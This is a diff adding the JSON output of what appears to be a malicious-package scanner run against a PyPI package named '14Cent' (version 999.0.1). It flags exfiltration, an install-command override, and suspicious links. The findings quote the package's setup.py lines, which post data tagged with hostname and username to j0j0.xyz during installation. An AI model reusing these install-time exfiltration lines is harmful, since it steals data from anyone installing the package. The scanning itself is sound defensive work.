@@ -1,0 +1,106 @@
+{
+    "issues": 17,
+    "errors": {},
+    "results": {
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:51",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld0/', data=pload1, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:52",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld1/', data=pload2, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:53",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld2/', data=pload3, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:54",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld3/', data=pload4, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:55",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld4/', data=pload5, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:59",
+                "code": "                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:64",
+                "code": "                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload2, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:69",
+                "code": "                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload3, verify=True, headers=headers)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "dll-hijacking": {},
+        "exec-base64": {},
+        "download-executable": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:73",
+                "code": "setup(name='14Cent',\n      version='999.0.1',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "obfuscation": {},
+        "shady-links": [
+            {
+                "location": "setup.py:51",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld0/', data=pload1, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:52",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld1/', data=pload2, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:53",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld2/', data=pload3, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:54",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld3/', data=pload4, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:55",
+                "code": "        requests.post('https://j0j0.xyz/lists/'+hostname+'/'+username+'/ld4/', data=pload5, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:59",
+                "code": "                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:64",
+                "code": "                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload2, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:69",
+                "code": "                r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload3, verify=True, headers=headers)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/14Cent-999.0.1"
+}
